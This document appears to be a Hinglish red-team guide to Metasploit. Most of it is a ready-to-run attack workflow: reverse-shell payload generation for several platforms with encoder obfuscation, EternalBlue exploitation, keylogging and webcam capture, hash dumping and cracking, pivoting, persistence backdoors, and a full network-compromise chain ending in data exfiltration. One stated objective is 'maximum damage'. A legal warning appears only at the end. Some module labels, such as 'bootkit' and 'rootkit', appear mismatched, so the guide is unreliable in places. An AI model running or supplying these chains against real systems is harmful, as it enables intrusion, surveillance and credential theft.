# Metasploit — Red Team Complete Guide

**Professional Exploitation Framework Guide**

---

## 1. Metasploit Basics aur Setup

**Objective:** Metasploit framework ko properly setup aur use karna.

```bash
# Metasploit start karo
msfconsole

# Database setup
sudo systemctl start postgresql
sudo msfdb init
msfconsole

# Background process
msfconsole -d

# Script file run karo
msfconsole -r exploit_script.rc
```

### Basic Commands

```bash
# Help command
help

# Search for exploits
search ms17-010
search type:exploit platform:windows
search rank:excellent

# Information
info exploit/windows/smb/ms17_010_eternalblue

# Show options
show options

# Set variables
set RHOST 192.168.1.100
set LHOST 192.168.1.10
set LPORT 4444

# Save options
save

# Load saved options
load profile_name
```

**Detection Difficulty:** ⭐⭐⭐⭐ (Traffic pattern signature)

---

## 2. Payload Generation with msfvenom

**Objective:** Custom payloads generate karna.

```bash
# Windows reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > shell.exe

# Linux reverse shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf > shell.elf

# Android reverse shell
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -o shell.apk

# PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw > shell.php

# Python reverse shell
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw > shell.py

# PowerShell reverse shell
msfvenom -p windows/powershell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw > shell.ps1

# Web shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.php
```

### Obfuscation

```bash
# Encoding with shikata_ga_nai
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -f exe > shell.exe

# Multiple encoding iterations
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 3 -f exe > shell.exe

# Different format
msfvenom -p windows/meterpreter/reverse_tcp -f dll > shell.dll
msfvenom -p windows/meterpreter/reverse_tcp -f msi > shell.msi
msfvenom -p windows/meterpreter/reverse_tcp -f vbs > shell.vbs
```

---

## 3. Listener Setup aur Handler

**Objective:** Incoming connections ke liye listener setup karna.

```bash
# Multi handler setup
use exploit/multi/handler

# Set payload
set payload windows/meterpreter/reverse_tcp

# Set options
set LHOST 192.168.1.10
set LPORT 4444

# Run listener
run

# Background listener
run -j

# Multiple listeners
set RHOST 0.0.0.0
set RPORT 4444
run
```

---

## 4. Windows Exploitation - EternalBlue

**Objective:** MS17-010 vulnerability exploit karna.

```bash
msfconsole

# Search for exploit
search ms17-010

# Use exploit
use exploit/windows/smb/ms17_010_eternalblue

# Set options
set RHOST 192.168.1.100
set LHOST 192.168.1.10
set LPORT 4444

# Set payload
set payload windows/meterpreter/reverse_tcp

# Exploit
exploit
```

---

## 5. Meterpreter Sessions Management

**Objective:** Compromised systems ko manage karna.

```bash
# List sessions
sessions -l

# Interact with session
sessions -i 1

# Background session
background

# Upgrade to meterpreter
sessions -u 1

# Kill session
sessions -k 1

# Route through session
route add 192.168.1.0 255.255.255.0 1

# Portfwd setup
portfwd add -l 3389 -r 192.168.2.100 -p 3389
```

---

## 6. Meterpreter Post-Exploitation

**Objective:** System ke andar maximum damage karna.

```bash
# Basic commands
info
sysinfo
ipconfig
netstat -an
route

# File operations
ls
cat /etc/passwd
download /etc/shadow
upload shell.exe C:\\Windows

# Process management
ps
migrate PID
kill PID

# Privilege escalation
getprivs
getsystem

# Persistence
run persistence -X -i 60 -p 4444 -r 192.168.1.10

# Keylogger
keyscan_start
keyscan_dump
keyscan_stop

# Screenshot
screenshot

# Webcam
web_list
web_snap
```

### Hashdump

```bash
# Dump hashes
hashdump

# Output:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

# Crack hashes
Hashcat -m 1000 hashes.txt wordlist.txt
```

---

## 7. Post-Exploitation Modules

**Objective:** Advanced post-exploitation techniques.

```bash
# Enumerate shares
run auxiliary/scanner/smb/smb_enumshares

# Dump SAM
run post/windows/gather/hashdump

# Enum applications
run post/windows/gather/enum_applications

# Enum logged-in users
run post/windows/gather/enum_logged_in_users

# Get DNS cache
run post/windows/gather/dumplinks

# Enum network
run post/windows/gather/enum_computers

# Get browser data
run post/windows/gather/enum_ie

# Get credentials
run post/windows/gather/credentials
```

---

## 8. Lateral Movement aur Pivoting

**Objective:** Compromised system se dusre systems tak pahunchna.

```bash
# Network scanning through pivot
route add 192.168.2.0 255.255.255.0 1
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.2.0/24
run

# Create SOCKS proxy
run auxiliary/server/socks5

# Proxy through metasploit
proxychains nmap -sV 192.168.2.0/24

# Port forwarding
portfwd add -l 3389 -r 192.168.2.100 -p 3389
rdesktop localhost:3389

# Inter-protocol relay
run auxiliary/server/http_server

# Psexec exploitation
use exploit/windows/smb/psexec
set RHOST 192.168.2.100
set SMBUser Administrator
set SMBPass password
exploit
```

---

## 9. Persistence aur Backdoors

**Objective:** Long-term access maintain karna.

```bash
# Registry run key
run persistence -X -i 60 -p 4444 -r 192.168.1.10

# Scheduled task
run scheduleme -m 5 -p windows/meterpreter/reverse_tcp -o LHOST=192.168.1.10

# Service creation
run service_persistence -m windows/meterpreter/reverse_tcp -o LHOST=192.168.1.10

# Bootkit
run exploit/windows/escalate/alpc_cve_2011_3402

# Rootkit installation
run post/windows/escalate/kitrap0d
```

---

## 10. Advanced Metasploit Combo Attack

**Objective:** Complete network compromise.

```bash
# Step 1: Port scan
use auxiliary/scanner/nmap/nmap
set RHOSTS 192.168.1.0/24
run

# Step 2: Vulnerability scan
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.100
run

# Step 3: Exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.1.100
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit

# Step 4: Post-exploitation
hashdump
run post/windows/gather/enum_logged_in_users
run post/windows/gather/enum_computers

# Step 5: Lateral movement
route add 192.168.2.0 255.255.255.0 1
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.2.0/24
run

# Step 6: New exploitation
use exploit/windows/smb/psexec
set RHOST 192.168.2.100
set payload windows/meterpreter/reverse_tcp
exploit

# Step 7: Persistence
run persistence -X -i 60

# Step 8: Data exfiltration
download /critical/data
upload backdoor.exe
```

---

## Kanuni Chetavni

```
⚖️ Savdhani! ⚖️

Metasploit sirf authorized penetration testing mein use karo!

✓ Apne organization ke permission se
✓ Bug bounty programs mein
✓ Training aur research mein

✗ Unauthorized access criminal offense hai
✗ Heavy prison time possible

Zimmedari se use karo!
```

---

**Banaya Gaya:** Metasploit Database  
**Classification:** Exploitation Framework  
**Skill Level:** Expert  
**Risk Level:** Critical
